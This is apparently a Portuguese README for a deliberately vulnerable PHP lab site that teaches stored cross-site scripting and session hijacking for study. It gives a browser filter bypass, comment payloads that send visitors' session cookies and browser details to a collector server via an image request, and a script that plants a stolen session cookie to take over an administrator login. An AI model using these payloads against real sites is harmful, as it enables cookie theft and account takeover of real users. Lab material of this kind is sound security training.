XSS STORED

XSS (CROSS SITE SCRIPTING)

ROUBO DE SESSÃO.

ESTE CONTEÚDO É PARA FINS DE ESTUDO!

USE ESTE CONHECIMENTO PARA MELHORAR SUAS APLICAÇÕES CONTRA ESSE TIPO DE ATAQUE.

USAR ISTO PARA PREJUDICAR OUTRAS PESSOAS É CRIME.

INÍCIO:

Caso tenha a Linguagem GO instalada, inicie o servidor no diretório [http-server]

Instale o Mysql e execute as Querys do arquivo 'sql.sql'

Iniciando o servidor do PHP na pasta do projeto:

    \> php -S localhost:8888

Acesse o site via URL:

    http://localhost:8888

Cadastre uma conta para poder comentar no site.

Acessar o painel do administrador:

    http://localhost:8888/admin/painel.php

Você só terá acesso ao painel do administrador, caso o cookie roubado tenha feito o login
como administrador.

O cadastro de administrador so pode ser feita no banco com ID de usuários ja cadastrados.

Observações

O google chrome bloqueia os Inputs de textos com o comando "<script>"

Existem algumas técnicas para furar esse bloqueio. Um dos exemplos testados foi deixar as tag's entre parenteses.

Exemplo:

    (<script>alert(document.cookie)</script>)

É possível fazer o teste no Firefox. 

O teste foi feito dia 17 de Novembro 2018. Talvez no futuro o Firebox também bloqueie.

A hack consiste em aplicar comandos javascript dentro dos inputs de texto dos formulários.

Se o site for vulnerável aos comandos, então talvez seja possível salva-los no banco de dados,

ao fazer isso o comando irá rodar em todas as máquinas que acessarem o site.

Esta técnica é chamada de XSS Stored pois o script e salvo no banco de dados.

Este site foi criado para estar vulnerável a este tipo de ataque, para fins de estudo.

Javascript Comandos

Pegar o PHPSESSID da sessão atual:

    document.cookie 

Pegar o Host da sessão atual:

    document.domain

Pegar o Sistema que está rodando:

    navigator.appName 
    
Pegar o navegador que está rodando:

    navigator.appVersion;

Fazer uma requisição HTTP:

    new Image().src="http://link"


Faça um comentário dentro do textarea com o seguinte comando:

    <script> new Image().src="http://localhost:3000/?=" document.cookie </script>

Script com mais informações:

    <script> new Image().src="http://localhost:3000/?=" + document.cookie + "&info=" + navigator.appName + " " + navigator.appVersion </script>    

*Localhost pode ser substituido pelo IP da máquina que está rodando o servidor HTTP, assim como a porta*

No comando acima uma requisição esta sendo feita ao webserver enviando via GET o ID da SESSÃO de quem acessou o site.

Para logar em uma conta através da sessão, umas das formas é: 

    - coloque o seguinte script, no campo de busca do site:

    <script> alert(document.cookie="PHPSESSID=COLOQUE O CODIGO DO COOKIE AQUI"); </script>

    Exemplo:

    <script> alert(document.cookie="PHPSESSID=ftu866p4lvrmumep4hokmv9h12"); </script>

Ao fazer isso você estará mudando seu cookie para o mesmo cookie capturado e assim dando acesso as páginas de sessões abertas a este cookie.

Neste site é necessário atualizar a página para verificar se o login foi realizado após o ataque.